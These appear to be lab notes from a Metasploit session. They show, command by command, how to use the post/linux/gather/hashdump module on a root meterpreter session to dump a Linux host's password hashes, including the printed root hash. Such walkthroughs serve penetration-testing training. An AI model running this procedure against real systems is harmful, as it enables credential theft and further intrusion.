
# So like in windows meterpreter session we simply used `hashdump` command , but in linux meterpreter session we can do that, so we will be using a metasploit module for it

meterpreter > `hashdump`
[-] Unknown command: hashdump.
meterpreter > 
Background session 2? [y/N]  
msf5 post(multi/manage/shell_to_meterpreter) > `search hashdump`

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   1   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   2   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   3   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   4   auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   5   auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   6   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   7   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   8   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   9   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   10  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   11  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   12  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   13  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   14  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   15  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   16  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   17  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


msf5 post(multi/manage/shell_to_meterpreter) > `use 10`
msf5 post(linux/gather/hashdump) > `options`

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > `sessions`

Active sessions
===============

  Id  Name  Type                   Information                                                     Connection
  --  ----  ----                   -----------                                                     ----------
  1         shell cmd/unix                                                                         192.37.7.2:4444 -> 192.37.7.3:59348 (192.37.7.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.37.7.3  192.37.7.2:4433 -> 192.37.7.3:60052 (192.37.7.3)
  3         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.37.7.3  192.37.7.2:4433 -> 192.37.7.3:44224 (192.37.7.3)

msf5 post(linux/gather/hashdump) > `set SESSION 2`
SESSION => 2
msf5 post(linux/gather/hashdump) > `run`

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20231230111401_default_192.37.7.3_linux.hashes_114086.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > 